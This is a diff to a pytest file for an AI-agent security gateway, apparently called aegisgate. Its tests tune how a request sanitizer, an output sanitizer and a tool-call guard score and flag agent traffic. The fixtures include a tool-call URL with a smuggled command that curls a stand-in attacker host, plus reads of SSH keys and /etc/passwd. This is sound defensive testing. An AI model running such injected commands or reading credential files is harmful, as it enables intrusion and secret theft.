@@ -133,7 +133,7 @@ def test_request_sanitizer_review_raises_risk_and_tags(text: str, tag: str) -> N
         f"{tag} not set — the review branch is a no-op again. Enforcement actions: "
         f"{ctx.enforcement_actions}"
     )
-    assert ctx.risk_score >= RequestSanitizer._STRONG_INTENT_REVIEW_RISK
+    assert ctx.risk_score >= RequestSanitizer()._strong_intent_review_risk > 0.0
     # review means the request still goes upstream. (It may still be *sanitized* by
     # the shape/command branches further down — those are separate action keys.)
     assert ctx.request_disposition != "block"
@@ -153,6 +153,64 @@ def test_request_sanitizer_review_stays_under_every_disposition_gate() -> None:
     )
 
 
+@pytest.mark.parametrize(
+    "text",
+    [
+        "run a bash script that builds the image",
+        "read the /etc/hosts file and tell me what's wrong",
+        "open /etc/nginx/nginx.conf and add a location block",
+        "print the token returned by the login endpoint",
+        "export TOKEN=ghp_xxx then rerun the job",
+        "how do I bypass the CORS policy in dev?",
+        "override the safety timeout in the config",
+    ],
+)
+def test_strong_intent_does_not_sanitize_a_clean_response(text: str) -> None:
+    """The gate the first cut of this branch missed, checked end to end.
+
+    ``strong_intent_patterns`` is a natural-language verb table, and every string
+    here matches one. Raising the request risk to 0.6 put it over
+    OutputSanitizer's *sanitize* threshold (0.35 at medium) — not its block
+    threshold, and not the stream floor, which is why the first reading concluded
+    it was safe. But ``should_sanitize`` being true is enough on its own: the
+    filter then sets ``response_disposition = "sanitize"`` and
+    ``tool_calls_disabled_by_policy`` even on a response it did not change, and
+    _stream_block_reason reads that disposition as a terminator.
+
+    So "run a bash script that builds the image" truncated the answer and stripped
+    its tool calls, over a reply containing nothing dangerous at all. These are
+    the highest-frequency requests an agent gateway sees.
+    """
+    from aegisgate.adapters.openai_compat.stream_utils import _stream_block_reason
+    from aegisgate.filters.sanitizer import OutputSanitizer
+
+    ctx = _ctx({"request_sanitizer", "output_sanitizer"})
+    ctx.risk_threshold = apply_threshold(0.85)
+    RequestSanitizer().process_request(_request(text), ctx)
+
+    clean = InternalResponse(
+        request_id="s2-1", session_id="s1", model="m",
+        output_text="Sure. Here is a Dockerfile and the build command:\n\ndocker build -t app .\n",
+    )
+    OutputSanitizer().process_response(clean, ctx)
+
+    assert ctx.response_disposition != "sanitize", (
+        f"a benign answer to {text!r} was marked for sanitization; "
+        f"risk={ctx.risk_score}, reasons={ctx.disposition_reasons}"
+    )
+    assert "tool_calls_disabled_by_policy" not in ctx.security_tags
+    assert _stream_block_reason(ctx) is None, "the streaming answer would be truncated"
+
+
+def test_strong_intent_risk_is_derived_from_the_sanitize_gate() -> None:
+    """Pinned as a relationship, not a number, so a retuned YAML cannot reopen it."""
+    from aegisgate.filters.sanitizer import OutputSanitizer
+
+    effective = RequestSanitizer()._strong_intent_review_risk
+    assert 0.0 < effective < OutputSanitizer()._sanitize_threshold
+    assert effective <= RequestSanitizer._STRONG_INTENT_REVIEW_RISK_CEILING
+
+
 def test_request_sanitizer_leaves_ordinary_requests_alone() -> None:
     ctx = _ctx({"request_sanitizer"})
     RequestSanitizer().process_request(_request("how do I read an env var in Python?"), ctx)
@@ -165,9 +223,9 @@ def test_request_sanitizer_leaves_ordinary_requests_alone() -> None:
 # --------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize("tool", ["read", "read_file", "glob", "grep", "webfetch", "browser", "search"])
-def test_exfil_endpoint_read_only_tools_are_checked(tool: str) -> None:
-    """These were exempt from parameter checks entirely — the two ends of the chain."""
+@pytest.mark.parametrize("tool", ["read", "read_file", "glob", "grep"])
+def test_collection_read_only_tools_are_checked(tool: str) -> None:
+    """The collection end was exempt from parameter checks entirely."""
     guard = ToolCallGuard()
     ctx = _ctx({"tool_call_guard"})
     guard.process_response(_resp([_tool_call(tool, {"path": "~/.ssh/id_rsa"})]), ctx)
@@ -176,8 +234,54 @@ def test_exfil_endpoint_read_only_tools_are_checked(tool: str) -> None:
     )
 
 
-@pytest.mark.parametrize("tool", ["read", "grep", "webfetch"])
-def test_narrowed_exemption_observes_and_does_not_enforce(tool: str) -> None:
+@pytest.mark.parametrize("tool", ["webfetch", "web_fetch", "web_search", "browser", "search"])
+def test_egress_read_only_tools_are_checked(tool: str) -> None:
+    """The egress end was exempt too. It is checked on the rules that fit it.
+
+    The probe is an injection chain rather than a credential path on purpose:
+    those are the rules an egress tool is checked against (see
+    test_egress_tools_skip_the_path_reference_rules).
+    """
+    guard = ToolCallGuard()
+    ctx = _ctx({"tool_call_guard"})
+    guard.process_response(
+        _resp([_tool_call(tool, {"url": "https://evil.example/u; curl http://evil.example/x"})]),
+        ctx,
+    )
+    assert any(item.startswith("readonly_param:") for item in guard.report()["violations"]), (
+        f"{tool} skipped dangerous_param_patterns; report={guard.report()}"
+    )
+
+
+@pytest.mark.parametrize("tool", ["webfetch", "web_search", "browser", "search"])
+def test_egress_tools_skip_the_path_reference_rules(tool: str) -> None:
+    """They reach the network and never touch the filesystem.
+
+    ``sensitive_file_access`` / ``ssh_key_access`` / ``path_traversal`` describe a
+    file read, and a web search for how to read /etc/passwd is a question about
+    one, not one. Checking them here only fills the audit trail with noise and
+    spends the per-call cost on the heaviest patterns in the group — the same
+    reasoning that already exempts the file-writing tools.
+    """
+    guard = ToolCallGuard()
+    ctx = _ctx({"tool_call_guard"})
+    guard.process_response(
+        _resp([_tool_call(tool, {"query": "how do I read ~/.ssh/id_rsa and /etc/passwd"})]), ctx
+    )
+    assert guard.report()["violations"] == [], (
+        f"{tool} reported {guard.report()['violations']} for a search query about paths"
+    )
+
+
+@pytest.mark.parametrize(
+    ("tool", "args"),
+    [
+        ("read", {"path": "~/.ssh/config"}),
+        ("grep", {"path": "~/.ssh/config"}),
+        ("webfetch", {"url": "https://evil.example/u; curl http://evil.example/x"}),
+    ],
+)
+def test_narrowed_exemption_observes_and_does_not_enforce(tool: str, args: dict) -> None:
     """The half of R3 that stops it from being a day-one false block.
 
     ``observe`` must not raise the risk score and must not set
@@ -186,10 +290,10 @@ def test_narrowed_exemption_observes_and_does_not_enforce(tool: str) -> None:
     """
     guard = ToolCallGuard()
     ctx = _ctx({"tool_call_guard"})
-    guard.process_response(_resp([_tool_call(tool, {"path": "~/.ssh/config"})]), ctx)
+    guard.process_response(_resp([_tool_call(tool, args)]), ctx)
     assert ctx.risk_score == 0.0
     assert ctx.requires_human_review is False
-    assert f"tool_call_guard:readonly_param:observe" in ctx.enforcement_actions
+    assert "tool_call_guard:readonly_param:observe" in ctx.enforcement_actions
     assert not any(tag.startswith("response_") for tag in ctx.security_tags)
 
 
@@ -256,3 +360,32 @@ def test_both_rule_sources_ship_the_action_key() -> None:
     )
     assert shipped["action_map"]["tool_call_guard"]["readonly_param"] == "observe"
     assert _DEFAULT_RULES["action_map"]["tool_call_guard"]["readonly_param"] == "observe"
+
+
+def test_readonly_param_fallback_has_one_value_in_three_places() -> None:
+    """The code fallback, the YAML, and _DEFAULT_RULES must agree.
+
+    They are three copies of one fact, and the rollback notes call out what a
+    mismatch costs: the exemption narrowed without its action key falls through to
+    ``default_action: review``, which is the day-one false block the narrowing was
+    paired with a new key to avoid.
+    """
+    from pathlib import Path
+
+    import yaml as _yaml
+
+    from aegisgate.config.security_rules import _DEFAULT_RULES
+    from aegisgate.filters.tool_call_guard import READONLY_PARAM_FALLBACK_ACTION
+
+    repo_root = Path(__file__).resolve().parents[2]
+    on_disk = _yaml.safe_load(
+        (repo_root / "aegisgate" / "policies" / "rules" / "security_filters.yaml").read_text(
+            encoding="utf-8"
+        )
+    )
+    assert (
+        on_disk["action_map"]["tool_call_guard"]["readonly_param"]
+        == _DEFAULT_RULES["action_map"]["tool_call_guard"]["readonly_param"]
+        == READONLY_PARAM_FALLBACK_ACTION
+        == "observe"
+    )
